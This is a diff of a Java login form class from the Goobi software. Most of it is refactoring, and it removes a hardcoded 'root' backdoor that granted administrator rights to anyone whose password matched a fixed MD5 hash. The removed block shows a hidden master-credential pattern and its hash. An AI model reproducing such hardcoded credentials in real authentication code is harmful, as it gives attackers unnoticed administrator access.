@@ -23,27 +23,23 @@
 package de.sub.goobi.forms;
 
 //TODO: Move Parts of this into a authentification API
-import java.io.File;
-import java.io.FilenameFilter;
-import java.security.NoSuchAlgorithmException;
-import java.util.HashSet;
-import java.util.Iterator;
-import java.util.List;
-import java.util.Set;
-
-import javax.faces.context.FacesContext;
-import javax.servlet.http.HttpSession;
 
 import de.sub.goobi.beans.Benutzer;
 import de.sub.goobi.beans.Benutzergruppe;
-import de.sub.goobi.metadaten.MetadatenSperrung;
-import de.sub.goobi.persistence.BenutzerDAO;
-import de.sub.goobi.persistence.BenutzergruppenDAO;
 import de.sub.goobi.config.ConfigMain;
 import de.sub.goobi.helper.Helper;
-import de.sub.goobi.helper.encryption.MD5;
 import de.sub.goobi.helper.exceptions.DAOException;
 import de.sub.goobi.helper.ldap.Ldap;
+import de.sub.goobi.metadaten.MetadatenSperrung;
+import de.sub.goobi.persistence.BenutzerDAO;
+
+import javax.faces.context.FacesContext;
+import javax.servlet.http.HttpSession;
+import java.io.File;
+import java.io.FilenameFilter;
+import java.security.NoSuchAlgorithmException;
+import java.util.Iterator;
+import java.util.List;
 
 public class LoginForm {
 	private String login;
@@ -76,26 +72,7 @@ public class LoginForm {
 		if (login == null) {
 			Helper.setFehlerMeldung("login", "", Helper.getTranslation("wrongLogin"));
 		} else {
-			if (login.equals("root")) {
-				String pwMD5 = new MD5(passwort).getMD5();
-				if (pwMD5.equals("c01dc87e699e49cba16cf22f99eec00c")) {
-					Benutzer b = new Benutzer();
-					b.setLogin("root");
-					try {
-						Benutzergruppe admin = new BenutzergruppenDAO().get(1);
-						Set<Benutzergruppe> l = new HashSet<Benutzergruppe>();
-						l.add(admin);
-						b.setBenutzergruppen(l);
-						myBenutzer = b;
-					} catch (DAOException e) {
 
-					}
-					// b.setBenutzergruppen(benutzergruppen)
-				} else {
-					Helper.setFehlerMeldung("login", "", Helper.getTranslation("wrongLogin"));
-				}
-				return "";
-			}
 			/* prüfen, ob schon ein Benutzer mit dem Login existiert */
 			// TODO: Use generics.
 			List<Benutzer> treffer;
@@ -108,7 +85,7 @@ public class LoginForm {
 			}
 			if (treffer != null && treffer.size() > 0) {
 				/* Login vorhanden, nun passwort prüfen */
-				Benutzer b = (Benutzer) treffer.get(0);
+				Benutzer b = treffer.get(0);
 				/* wenn der Benutzer auf inaktiv gesetzt (z.B. arbeitet er nicht mehr hier) wurde, jetzt Meldung anzeigen */
 				if (!b.isIstAktiv()) {
 					Helper.setFehlerMeldung("login", "", "login inactiv");
@@ -126,10 +103,8 @@ public class LoginForm {
 					} else {
 						schonEingeloggt = true;
 						tempBenutzer = b;
-						// Helper.setMeldung("formLogin:login", "", "Benutzer in anderer Session aktiv", false);
 					}
 				} else
-					// schonEingeloggt = false;
 					Helper.setFehlerMeldung("passwort", "", "wrong password");
 			} else {
 				/* Login nicht vorhanden, also auch keine Passwortprüfung */
@@ -201,7 +176,6 @@ public class LoginForm {
 	 */
 	public String PasswortAendernSpeichern() {
 		/* ist das aktuelle Passwort korrekt angegeben ? */
-		// if (!passwortAendernAlt.equals(myBenutzer.getPasswort())) {
 		if (!myBenutzer.istPasswortKorrekt(passwortAendernAlt)) {
 			Helper.setFehlerMeldung("passwortform:passwortAendernAlt", "", Helper.getTranslation("aktuellesPasswortFalsch"));
 		} else {
@@ -263,10 +237,11 @@ public class LoginForm {
 
 		/* alle Dateien durchlaufen und die alten löschen */
 		if (dateien != null) {
-			for (int i = 0; i < dateien.length; i++) {
-				File file = new File(myPfad + dateien[i]);
-				if ((System.currentTimeMillis() - file.lastModified()) > 7200000)
+			for (String aDateien : dateien) {
+				File file = new File(myPfad + aDateien);
+				if ((System.currentTimeMillis() - file.lastModified()) > 7200000) {
 					file.delete();
+				}
 			}
 		}
 	}
@@ -305,11 +280,9 @@ public class LoginForm {
 	public int getMaximaleBerechtigung() {
 		int rueckgabe = 0;
 		if (myBenutzer != null) {
-			// TODO: Don't use Iterators
-			for (Iterator<Benutzergruppe> iter = myBenutzer.getBenutzergruppen().iterator(); iter.hasNext();) {
-				Benutzergruppe element = (Benutzergruppe) iter.next();
-				if (element.getBerechtigung().intValue() < rueckgabe || rueckgabe == 0)
-					rueckgabe = element.getBerechtigung().intValue();
+			for (Benutzergruppe element : myBenutzer.getBenutzergruppen()) {
+				if ((rueckgabe == 0) || (element.getBerechtigung() < rueckgabe))
+					rueckgabe = element.getBerechtigung();
 			}
 		}
 		return rueckgabe;
